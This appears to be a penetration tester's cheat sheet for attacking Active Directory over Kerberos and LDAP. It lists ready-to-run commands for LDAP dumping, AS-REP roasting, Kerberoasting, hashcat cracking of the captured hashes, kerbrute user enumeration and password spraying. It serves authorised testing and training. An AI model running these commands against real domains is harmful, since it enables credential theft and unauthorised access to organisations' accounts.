# Kerberos (88) and LDAP (389/636)

If you see these ports, you're dealing with Active Directory. This changes your entire approach.

## Nmap Scripts

```bash
# LDAP
nmap -sV -sC -p 389,636 <target ip>
nmap --script ldap-search -p 389 <target ip>
nmap --script ldap-rootdse -p 389 <target ip>           # get domain info

# Kerberos
nmap -sV -sC -p 88 <target ip>
```

## LDAP Enumeration

```bash
# anonymous bind (no creds)
ldapsearch -x -H ldap://<target ip> -b '' -s base namingContexts
ldapsearch -x -H ldap://<target ip> -b 'DC=domain,DC=local'
ldapsearch -x -H ldap://<target ip> -b 'DC=domain,DC=local' '(objectClass=user)' sAMAccountName

# with creds
ldapsearch -x -H ldap://<target ip> -D 'user@domain.local' -w 'password' -b 'DC=domain,DC=local'

# dump everything
ldapsearch -x -H ldap://<target ip> -D 'user@domain.local' -w 'password' -b 'DC=domain,DC=local' '*'

# nxc LDAP
nxc ldap <target ip> -u '' -p '' --kdcHost <target ip>
nxc ldap <target ip> -u <user> -p <password> --users
nxc ldap <target ip> -u <user> -p <password> --groups
```

## Kerberos Attacks (impacket)

```bash
# AS-REP Roasting (no creds needed, just usernames)
# finds users with "Do not require Kerberos preauthentication" set
impacket-GetNPUsers <domain>/ -usersfile users.txt -no-pass -dc-ip <target ip> -format hashcat

# crack the hash
hashcat -m 18200 asrep_hash.txt /usr/share/wordlists/rockyou.txt

# Kerberoasting (needs valid creds)
# finds service accounts with SPNs set
impacket-GetUserSPNs <domain>/<user>:<password> -dc-ip <target ip> -request

# crack the hash
hashcat -m 13100 tgs_hash.txt /usr/share/wordlists/rockyou.txt

# enumerate users via Kerberos (no creds)
kerbrute userenum -d <domain> --dc <target ip> users.txt
```

## NXC AD Enumeration

```bash
# password spray
nxc smb <target ip> -u users.txt -p 'Password123!' --no-bruteforce

# check who can WinRM
nxc winrm <target ip> -u <user> -p <password>

# dump password policy (to avoid lockout during spray)
nxc smb <target ip> -u <user> -p <password> --pass-pol
```
